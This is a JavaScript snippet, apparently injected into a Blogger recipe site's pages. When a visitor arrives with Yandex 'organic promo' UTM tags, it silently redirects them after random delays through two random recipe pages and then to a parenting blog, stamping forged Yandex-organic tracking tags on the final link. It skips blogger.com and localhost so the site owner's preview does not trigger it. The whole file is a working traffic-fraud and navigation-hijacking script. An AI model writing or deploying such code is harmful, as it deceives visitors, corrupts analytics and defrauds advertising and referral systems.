//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
    "https://www.kulinarnyjray.ru/2023/06/spicy-thai-basil-chicken-stir-fry.html",
	"https://www.kulinarnyjray.ru/2023/06/creamy-garlic-parmesan-shrimp-pasta.html",
	"https://www.kulinarnyjray.ru/2023/06/bbq-pulled-pork-sliders-with-tangy.html",
	"https://www.kulinarnyjray.ru/2023/06/mediterranean-quinoa-salad-with-lemon.html",
	"https://www.kulinarnyjray.ru/2023/06/vegan-chickpea-curry-with-coconut-milk.html",
	"https://www.kulinarnyjray.ru/2023/06/baked-teriyaki-salmon-with-sesame-glaze.html",
	"https://www.kulinarnyjray.ru/2023/06/classic-margherita-pizza-with-fresh.html",
	"https://www.kulinarnyjray.ru/2023/06/cheesy-baked-zucchini-casserole.html",
	"https://www.kulinarnyjray.ru/2023/06/mexican-street-corn-salad-with-chili.html",
    "https://www.kulinarnyjray.ru/2023/06/decadent-chocolate-lava-cake-with.html"
    ];

    const externalLinks = [
    "https://www.vospitanieideti.ru/2023/08/exploring-through-taste-introducing.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.vospitanieideti.ru/2023/08/sleeping-sweetly-tips-and-tricks-for.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.vospitanieideti.ru/2023/08/playtime-wonders-stimulating-toys-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.vospitanieideti.ru/2023/08/soothing-strategies-effective.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.vospitanieideti.ru/2023/08/tiny-fashionistas-adorable-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.vospitanieideti.ru/2023/08/capturing-memories-creative-ideas-for.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.vospitanieideti.ru/2023/08/healthy-beginnings-expert-insights-into.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.vospitanieideti.ru/2023/08/babys-firsts-capturing-milestones-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.vospitanieideti.ru/2023/08/growing-together-building-strong-parent.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.vospitanieideti.ru/2023/08/soothing-strategies-effective_30.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();

//]]>

